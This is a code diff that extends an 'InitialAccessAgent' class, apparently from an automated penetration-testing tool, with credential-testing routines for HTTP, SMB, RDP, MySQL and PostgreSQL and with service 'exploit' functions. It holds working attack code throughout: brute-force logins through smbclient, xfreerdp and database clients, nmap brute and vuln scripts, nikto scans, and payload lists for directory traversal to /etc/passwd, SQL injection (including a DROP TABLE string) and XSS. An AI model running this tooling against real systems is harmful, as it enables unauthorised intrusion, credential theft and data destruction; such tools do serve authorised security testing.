@@ -482,12 +482,24 @@ class InitialAccessAgent(Agent):
                 return await self._test_ssh_credentials(target, port, username, password)
             elif service == 'ftp':
                 return await self._test_ftp_credentials(target, port, username, password)
+            elif service == 'http' or service == 'https':
+                return await self._test_http_credentials(target, port, username, password)
+            elif service == 'smb':
+                return await self._test_smb_credentials(target, port, username, password)
+            elif service == 'telnet':
+                return await self._test_telnet_credentials(target, port, username, password)
+            elif service == 'rdp':
+                return await self._test_rdp_credentials(target, port, username, password)
+            elif service == 'mysql':
+                return await self._test_mysql_credentials(target, port, username, password)
+            elif service == 'postgresql':
+                return await self._test_postgresql_credentials(target, port, username, password)
             else:
                 return {
                     "username": username,
                     "password": password,
                     "success": False,
-                    "reason": f"Credential testing not implemented for {service}"
+                    "reason": f"Credential testing not yet implemented for {service}"
                 }
                 
         except Exception as e:
@@ -570,14 +582,667 @@ class InitialAccessAgent(Agent):
                 "success": False,
                 "error": str(e)
             }
+
+    async def _test_http_credentials(self, target: str, port: int, username: str, password: str) -> Dict:
+        """Test HTTP/HTTPS credentials."""
+        try:
+            import base64
+            import urllib.request
+            import urllib.error
+            
+            auth_string = base64.b64encode(f"{username}:{password}".encode()).decode()
+            url = f"http://{target}:{port}/admin"
+            
+            req = urllib.request.Request(url)
+            req.add_header("Authorization", f"Basic {auth_string}")
+            
+            try:
+                response = urllib.request.urlopen(req, timeout=10)
+                if response.getcode() == 200:
+                    return {
+                        "username": username,
+                        "password": password,
+                        "success": True,
+                        "service": "http"
+                    }
+            except urllib.error.HTTPError as e:
+                if e.code != 401:
+                    return {
+                        "username": username,
+                        "password": password,
+                        "success": True,
+                        "service": "http",
+                        "note": f"HTTP {e.code} response"
+                    }
+            
+            return {
+                "username": username,
+                "password": password,
+                "success": False,
+                "reason": "HTTP authentication failed"
+            }
+        except Exception as e:
+            return {
+                "username": username,
+                "password": password,
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _test_smb_credentials(self, target: str, port: int, username: str, password: str) -> Dict:
+        """Test SMB credentials."""
+        try:
+            cmd = ["smbclient", "-L", target, "-U", f"{username}%{password}", "-p", str(port)]
+            
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            
+            stdout, stderr = await process.communicate()
+            
+            if process.returncode == 0 and "Sharename" in stdout.decode():
+                return {
+                    "username": username,
+                    "password": password,
+                    "success": True,
+                    "service": "smb"
+                }
+            else:
+                return {
+                    "username": username,
+                    "password": password,
+                    "success": False,
+                    "reason": "SMB authentication failed"
+                }
+        except Exception as e:
+            return {
+                "username": username,
+                "password": password,
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _test_telnet_credentials(self, target: str, port: int, username: str, password: str) -> Dict:
+        """Test Telnet credentials."""
+        try:
+            return {
+                "username": username,
+                "password": password,
+                "success": False,
+                "reason": "Telnet credential testing requires interactive session handling"
+            }
+        except Exception as e:
+            return {
+                "username": username,
+                "password": password,
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _test_rdp_credentials(self, target: str, port: int, username: str, password: str) -> Dict:
+        """Test RDP credentials."""
+        try:
+            cmd = ["xfreerdp", f"/v:{target}:{port}", f"/u:{username}", f"/p:{password}", "/cert-ignore", "+auth-only"]
+            
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            
+            stdout, stderr = await process.communicate()
+            
+            if "Authentication only" in stdout.decode() and process.returncode == 0:
+                return {
+                    "username": username,
+                    "password": password,
+                    "success": True,
+                    "service": "rdp"
+                }
+            else:
+                return {
+                    "username": username,
+                    "password": password,
+                    "success": False,
+                    "reason": "RDP authentication failed"
+                }
+        except Exception as e:
+            return {
+                "username": username,
+                "password": password,
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _test_mysql_credentials(self, target: str, port: int, username: str, password: str) -> Dict:
+        """Test MySQL credentials."""
+        try:
+            cmd = ["mysql", "-h", target, "-P", str(port), "-u", username, f"-p{password}", "-e", "SELECT 1;"]
+            
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            
+            stdout, stderr = await process.communicate()
+            
+            if process.returncode == 0:
+                return {
+                    "username": username,
+                    "password": password,
+                    "success": True,
+                    "service": "mysql"
+                }
+            else:
+                return {
+                    "username": username,
+                    "password": password,
+                    "success": False,
+                    "reason": "MySQL authentication failed"
+                }
+        except Exception as e:
+            return {
+                "username": username,
+                "password": password,
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _test_postgresql_credentials(self, target: str, port: int, username: str, password: str) -> Dict:
+        """Test PostgreSQL credentials."""
+        try:
+            cmd = ["psql", "-h", target, "-p", str(port), "-U", username, "-d", "postgres", "-c", "SELECT 1;"]
+            
+            env = {"PGPASSWORD": password, **dict(os.environ)}
+            
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                env=env
+            )
+            
+            stdout, stderr = await process.communicate()
+            
+            if process.returncode == 0:
+                return {
+                    "username": username,
+                    "password": password,
+                    "success": True,
+                    "service": "postgresql"
+                }
+            else:
+                return {
+                    "username": username,
+                    "password": password,
+                    "success": False,
+                    "reason": "PostgreSQL authentication failed"
+                }
+        except Exception as e:
+            return {
+                "username": username,
+                "password": password,
+                "success": False,
+                "error": str(e)
+            }
     
     async def _generic_exploit_attempt(self, target: str, port: str, service_type: str, exploit: str) -> Dict:
         """Generic exploitation attempt."""
-        return {
-            "exploit": exploit,
-            "success": False,
-            "reason": f"Generic exploitation not implemented for {service_type}"
-        }
+        try:
+            if service_type.lower() == 'http' or service_type.lower() == 'https':
+                return await self._exploit_web_service(target, port, exploit)
+            elif service_type.lower() == 'smb':
+                return await self._exploit_smb_service(target, port, exploit)
+            elif service_type.lower() == 'ssh':
+                return await self._exploit_ssh_service(target, port, exploit)
+            elif service_type.lower() == 'ftp':
+                return await self._exploit_ftp_service(target, port, exploit)
+            elif service_type.lower() == 'telnet':
+                return await self._exploit_telnet_service(target, port, exploit)
+            elif service_type.lower() == 'rdp':
+                return await self._exploit_rdp_service(target, port, exploit)
+            elif service_type.lower() == 'mysql':
+                return await self._exploit_mysql_service(target, port, exploit)
+            elif service_type.lower() == 'postgresql':
+                return await self._exploit_postgresql_service(target, port, exploit)
+            else:
+                return await self._generic_service_exploit(target, port, service_type, exploit)
+        except Exception as e:
+            return {
+                "exploit": exploit,
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _exploit_web_service(self, target: str, port: str, exploit: str) -> Dict:
+        """Exploit web services using common vulnerabilities."""
+        try:
+            base_url = f"http://{target}:{port}"
+            
+            if "directory_traversal" in exploit.lower():
+                return await self._test_directory_traversal(base_url)
+            elif "sql_injection" in exploit.lower():
+                return await self._test_sql_injection_basic(base_url)
+            elif "file_upload" in exploit.lower():
+                return await self._test_file_upload_bypass(base_url)
+            elif "xss" in exploit.lower():
+                return await self._test_xss_basic(base_url)
+            else:
+                return await self._generic_web_vulnerability_scan(base_url)
+                
+        except Exception as e:
+            return {
+                "exploit": exploit,
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _exploit_smb_service(self, target: str, port: str, exploit: str) -> Dict:
+        """Exploit SMB services."""
+        try:
+            if "eternal_blue" in exploit.lower():
+                return await self._exploit_eternal_blue(target)
+            elif "null_session" in exploit.lower():
+                return await self._exploit_smb_null_session(target)
+            else:
+                return await self._generic_smb_exploit(target, exploit)
+        except Exception as e:
+            return {
+                "exploit": exploit,
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _exploit_ssh_service(self, target: str, port: str, exploit: str) -> Dict:
+        """Exploit SSH services."""
+        try:
+            cmd = ["nmap", "--script", "ssh-brute,ssh-auth-methods", f"{target}", "-p", port]
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            stdout, stderr = await process.communicate()
+            
+            if "Authentication methods" in stdout.decode():
+                return {
+                    "exploit": exploit,
+                    "success": True,
+                    "result": "SSH service enumerated successfully",
+                    "details": stdout.decode()
+                }
+            else:
+                return {
+                    "exploit": exploit,
+                    "success": False,
+                    "reason": "SSH enumeration failed"
+                }
+        except Exception as e:
+            return {
+                "exploit": exploit,
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _exploit_ftp_service(self, target: str, port: str, exploit: str) -> Dict:
+        """Exploit FTP services."""
+        try:
+            cmd = ["ftp", "-n", target, port]
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdin=asyncio.subprocess.PIPE,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            
+            commands = "user anonymous\npass anonymous@\nls\nquit\n"
+            stdout, stderr = await process.communicate(input=commands.encode())
+            
+            if "230" in stdout.decode() or "Login successful" in stdout.decode():
+                return {
+                    "exploit": exploit,
+                    "success": True,
+                    "result": "Anonymous FTP access successful",
+                    "details": stdout.decode()
+                }
+            else:
+                return {
+                    "exploit": exploit,
+                    "success": False,
+                    "reason": "Anonymous FTP access denied"
+                }
+        except Exception as e:
+            return {
+                "exploit": exploit,
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _exploit_telnet_service(self, target: str, port: str, exploit: str) -> Dict:
+        """Exploit Telnet services."""
+        try:
+            cmd = ["nmap", "--script", "telnet-brute,banner", f"{target}", "-p", port]
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            stdout, stderr = await process.communicate()
+            
+            if "banner" in stdout.decode().lower():
+                return {
+                    "exploit": exploit,
+                    "success": True,
+                    "result": "Telnet banner retrieved",
+                    "details": stdout.decode()
+                }
+            else:
+                return {
+                    "exploit": exploit,
+                    "success": False,
+                    "reason": "Telnet enumeration failed"
+                }
+        except Exception as e:
+            return {
+                "exploit": exploit,
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _exploit_rdp_service(self, target: str, port: str, exploit: str) -> Dict:
+        """Exploit RDP services."""
+        try:
+            cmd = ["nmap", "--script", "rdp-enum-encryption,rdp-vuln-ms12-020", f"{target}", "-p", port]
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            stdout, stderr = await process.communicate()
+            
+            if "rdp" in stdout.decode().lower():
+                return {
+                    "exploit": exploit,
+                    "success": True,
+                    "result": "RDP service enumerated",
+                    "details": stdout.decode()
+                }
+            else:
+                return {
+                    "exploit": exploit,
+                    "success": False,
+                    "reason": "RDP enumeration failed"
+                }
+        except Exception as e:
+            return {
+                "exploit": exploit,
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _exploit_mysql_service(self, target: str, port: str, exploit: str) -> Dict:
+        """Exploit MySQL services."""
+        try:
+            cmd = ["nmap", "--script", "mysql-enum,mysql-brute", f"{target}", "-p", port]
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            stdout, stderr = await process.communicate()
+            
+            if "mysql" in stdout.decode().lower():
+                return {
+                    "exploit": exploit,
+                    "success": True,
+                    "result": "MySQL service enumerated",
+                    "details": stdout.decode()
+                }
+            else:
+                return {
+                    "exploit": exploit,
+                    "success": False,
+                    "reason": "MySQL enumeration failed"
+                }
+        except Exception as e:
+            return {
+                "exploit": exploit,
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _exploit_postgresql_service(self, target: str, port: str, exploit: str) -> Dict:
+        """Exploit PostgreSQL services."""
+        try:
+            cmd = ["nmap", "--script", "pgsql-brute", f"{target}", "-p", port]
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            stdout, stderr = await process.communicate()
+            
+            if "postgresql" in stdout.decode().lower():
+                return {
+                    "exploit": exploit,
+                    "success": True,
+                    "result": "PostgreSQL service enumerated",
+                    "details": stdout.decode()
+                }
+            else:
+                return {
+                    "exploit": exploit,
+                    "success": False,
+                    "reason": "PostgreSQL enumeration failed"
+                }
+        except Exception as e:
+            return {
+                "exploit": exploit,
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _generic_service_exploit(self, target: str, port: str, service_type: str, exploit: str) -> Dict:
+        """Generic service exploitation using nmap scripts."""
+        try:
+            cmd = ["nmap", "--script", f"vuln,{service_type}-*", f"{target}", "-p", port]
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            stdout, stderr = await process.communicate()
+            
+            if "VULNERABLE" in stdout.decode():
+                return {
+                    "exploit": exploit,
+                    "success": True,
+                    "result": f"Vulnerability found in {service_type} service",
+                    "details": stdout.decode()
+                }
+            else:
+                return {
+                    "exploit": exploit,
+                    "success": False,
+                    "reason": f"No vulnerabilities found in {service_type} service"
+                }
+        except Exception as e:
+            return {
+                "exploit": exploit,
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _test_directory_traversal(self, base_url: str) -> Dict:
+        """Test for directory traversal vulnerabilities."""
+        try:
+            import urllib.request
+            import urllib.parse
+            
+            payloads = [
+                "../../../etc/passwd",
+                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+                "....//....//....//etc/passwd",
+                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+            ]
+            
+            for payload in payloads:
+                test_url = f"{base_url}/?file={urllib.parse.quote(payload)}"
+                try:
+                    response = urllib.request.urlopen(test_url, timeout=10)
+                    content = response.read().decode()
+                    
+                    if "root:" in content or "Administrator" in content:
+                        return {
+                            "exploit": "directory_traversal",
+                            "success": True,
+                            "result": f"Directory traversal successful with payload: {payload}",
+                            "details": content[:500]
+                        }
+                except:
+                    continue
+            
+            return {
+                "exploit": "directory_traversal",
+                "success": False,
+                "reason": "No directory traversal vulnerabilities found"
+            }
+        except Exception as e:
+            return {
+                "exploit": "directory_traversal",
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _test_sql_injection_basic(self, base_url: str) -> Dict:
+        """Test for basic SQL injection vulnerabilities."""
+        try:
+            import urllib.request
+            import urllib.parse
+            
+            payloads = [
+                "' OR '1'='1",
+                "' OR 1=1--",
+                "' UNION SELECT 1,2,3--",
+                "'; DROP TABLE users--"
+            ]
+            
+            for payload in payloads:
+                test_url = f"{base_url}/?id={urllib.parse.quote(payload)}"
+                try:
+                    response = urllib.request.urlopen(test_url, timeout=10)
+                    content = response.read().decode()
+                    
+                    if "error" in content.lower() or "sql" in content.lower() or "mysql" in content.lower():
+                        return {
+                            "exploit": "sql_injection",
+                            "success": True,
+                            "result": f"SQL injection vulnerability found with payload: {payload}",
+                            "details": content[:500]
+                        }
+                except:
+                    continue
+            
+            return {
+                "exploit": "sql_injection",
+                "success": False,
+                "reason": "No SQL injection vulnerabilities found"
+            }
+        except Exception as e:
+            return {
+                "exploit": "sql_injection",
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _test_file_upload_bypass(self, base_url: str) -> Dict:
+        """Test for file upload bypass vulnerabilities."""
+        try:
+            return {
+                "exploit": "file_upload",
+                "success": False,
+                "reason": "File upload testing requires manual verification"
+            }
+        except Exception as e:
+            return {
+                "exploit": "file_upload",
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _test_xss_basic(self, base_url: str) -> Dict:
+        """Test for basic XSS vulnerabilities."""
+        try:
+            import urllib.request
+            import urllib.parse
+            
+            payloads = [
+                "<script>alert('XSS')</script>",
+                "javascript:alert('XSS')",
+                "<img src=x onerror=alert('XSS')>"
+            ]
+            
+            for payload in payloads:
+                test_url = f"{base_url}/?q={urllib.parse.quote(payload)}"
+                try:
+                    response = urllib.request.urlopen(test_url, timeout=10)
+                    content = response.read().decode()
+                    
+                    if payload in content:
+                        return {
+                            "exploit": "xss",
+                            "success": True,
+                            "result": f"XSS vulnerability found with payload: {payload}",
+                            "details": content[:500]
+                        }
+                except:
+                    continue
+            
+            return {
+                "exploit": "xss",
+                "success": False,
+                "reason": "No XSS vulnerabilities found"
+            }
+        except Exception as e:
+            return {
+                "exploit": "xss",
+                "success": False,
+                "error": str(e)
+            }
+
+    async def _generic_web_vulnerability_scan(self, base_url: str) -> Dict:
+        """Generic web vulnerability scanning."""
+        try:
+            cmd = ["nikto", "-h", base_url, "-Format", "txt"]
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            stdout, stderr = await process.communicate()
+            
+            if "OSVDB" in stdout.decode() or "vulnerability" in stdout.decode().lower():
+                return {
+                    "exploit": "web_vulnerability_scan",
+                    "success": True,
+                    "result": "Web vulnerabilities found",
+                    "details": stdout.decode()
+                }
+            else:
+                return {
+                    "exploit": "web_vulnerability_scan",
+                    "success": False,
+                    "reason": "No web vulnerabilities found"
+                }
+        except Exception as e:
+            return {
+                "exploit": "web_vulnerability_scan",
+                "success": False,
+                "error": str(e)
+            }
     
     async def _generate_next_steps(self, results: Dict) -> List[str]:
         """Generate next steps based on exploitation results."""
